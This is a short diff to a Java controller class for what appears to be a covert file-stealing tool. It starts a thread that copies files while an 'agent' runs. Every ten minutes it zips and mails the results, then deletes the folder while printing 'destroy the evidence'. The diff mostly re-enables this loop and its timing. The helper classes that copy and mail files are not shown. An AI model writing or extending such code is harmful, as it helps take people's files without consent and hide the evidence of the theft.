@@ -1,9 +1,13 @@
-import stopwatch.Renamer;
 
 
 public class Controller {
 	
 	public static void main(String args[]){
+		
+	//start with an empty folder
+		DeleteDirectory d = new DeleteDirectory();
+		d.Delete();
+		
 	//start the thread to copy files as tHe agent runs. 
 			Thread f = new Thread(new CopyFiles());
 			System.out.println("running copier");
@@ -16,26 +20,25 @@ public class Controller {
 	
 	 		
 	while(true){
-/**		try {
+		try {
 			Thread.sleep(600000);
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-	**///mail me the result
+	///mail me the result
 		System.out.println("trying to mail");
 			Mail2 m = new Mail2();
 			m.zipandmail();
 			System.out.println("mailem");
 	//Delete the Directory
-			DeleteDirectory d = new DeleteDirectory();
 			d.Delete();
 			
 			
 			System.out.println("destroy the evidence");
 	//wait  ten minutes
 	try {
-		Thread.sleep(1000000);
+		Thread.sleep(600000);
 	} catch (InterruptedException e) {
 		// TODO Auto-generated catch block
 		e.printStackTrace();
